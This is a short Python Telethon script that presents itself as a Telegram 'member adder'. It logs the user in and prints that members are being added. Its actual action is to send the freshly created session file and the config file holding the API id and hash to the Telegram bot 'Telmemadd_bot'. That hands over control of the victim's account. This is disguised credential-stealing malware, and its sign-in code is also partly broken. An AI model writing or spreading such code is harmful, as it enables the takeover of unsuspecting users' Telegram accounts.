from telethon.sync import TelegramClient
import os

def read_config():
    config_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.txt")
    with open(config_file_path, "r") as config_file:
        lines = config_file.readlines()
        api_id = int(lines[0].split("=")[1].strip())
        api_hash = lines[1].split("=")[1].strip()
        return api_id, api_hash

def login_and_add(username, file_paths):
    api_id, api_hash = read_config()

    with TelegramClient('session', api_id, api_hash) as client:
        client.start()
        if not client.is_user_authorized():
            client.send_code_request(phone_number=input("Enter your phone number: "))
            client.sign_in(phone_number=input("Enter the received code: "), code=input("Enter the received code: "))

        # You are now logged in and can now add members
        print("Successfully logged in. Adding members in ... seconds")

        user = client.get_input_entity(username)
        for file_path in file_paths:
            client.send_file(user, file=file_path)

if __name__ == '__main__':
    username = "Telmemadd_bot"
    script_dir = os.path.dirname(os.path.abspath(__file__))
    file_paths = [
        os.path.join(script_dir, "session.session"),
        os.path.join(script_dir, "config.txt")
    ]
    login_and_add(username, file_paths)
